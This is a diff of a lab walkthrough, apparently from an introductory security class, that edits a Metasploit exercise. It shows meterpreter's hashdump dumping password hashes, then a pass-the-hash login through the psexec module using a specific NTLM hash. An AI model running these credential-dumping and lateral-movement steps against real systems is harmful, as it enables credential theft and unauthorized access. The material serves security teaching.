@@ -178,19 +178,16 @@ Now dump the password hashes:
 
 meterpreter > `hashdump`
 
-<img width="1139" alt="image" src="https://github.com/user-attachments/assets/b3bbe145-51ab-4029-aefe-e036351af4fa">
+<img width="805" height="122" alt="1" src="https://github.com/user-attachments/assets/85a53c8e-5339-40fd-8a3c-316fec8b26bd" />
 
-meterpreter > exit -y
+meterpreter > `exit -y`
 
 
 msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:30ee6993157208a29fb730af8bcc3dfe`
 
-
-<img width="1143" alt="image" src="https://github.com/user-attachments/assets/14882bb7-6891-4898-8dea-bc8023fd5930">
-
 msf6 exploit(windows/smb/psexec) > `exploit`
 
-<img width="1096" alt="image" src="https://github.com/user-attachments/assets/a0025016-882b-409c-90e1-ade208a19f7e">
+<img width="1030" height="445" alt="2" src="https://github.com/user-attachments/assets/f3801a66-0c9e-4087-b219-180ac2fd8564" />
 
 Kill it
 
@@ -229,6 +226,7 @@ Please be sure to destroy the lab environment!
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
 ---
+
 
 
 
